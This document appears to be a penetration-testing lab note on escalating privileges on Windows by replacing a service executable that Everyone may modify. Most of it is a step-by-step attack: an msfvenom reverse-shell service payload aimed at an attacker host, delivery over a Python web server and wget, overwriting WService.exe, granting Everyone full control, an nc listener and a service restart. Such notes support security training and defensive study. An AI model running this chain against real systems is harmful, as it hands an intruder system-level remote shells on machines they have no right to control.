# Insecure Permissions on Service Executable

Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

Check service configuration using `sc qc` in example apphostsvc service:

```cmd
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```

Here we can see that the associated executable is specified through the **BINARY_PATH_NAM** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter

>Note:
>sc = Service Controller
>qc = Query Configure
>sc qc <Service_name>

we are gonna check it with `sc` in example windows scheduler service

```cmd
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRAM\SYSTEM\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```
the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\PROGRAM\SYSTEM\WService.exe`

then check the permission on the executable

```cmd
C:\>icacls C:\PROGRAM\SYSTEM\WService.exe
C:\PROGRAM\SYSTEM\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

in line 1 Everyone:(I)(M), (M) mean everyone in group has modify permission (M) on the service's executable, it mean i can simply overwrite it with any payload, and the service ill execute it with the privileges of the configured user account

generate `exe-service` payload using `msfvenom` and serve it through a `python webserver`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=MY-IP LPORT=1337 -f exe-service -o rev-svc.exe
```
```
python3 -m http.server
```

run wget in target machine with same python webserver port

Once the payload is in the Windows server, replace the service executable with payload. Since i need another user to execute the payload, i'll want to grant full permissions to the Everyone group as well:

backup first the original service exe file

```cmd
C:\PROGRAM\SYSTEM> move WService.exe WService.exe.bkp
```

move and rename the payload to the service path

```cmd
C:\PROGRAM\SYSTEM> move C:\Users\0xbscure\rev-svc.exe WService.exe
```

change full permission to everyone

```cmd
C:\PROGRAM\SYSTEM>icacls WService.exe /grant Everyone:F
```

Start listener with `nc` in same port

`nc -lvp 1337`

restart the service 

```cmd
sc stop windowsscheduler
sc start windowsscheduler
```
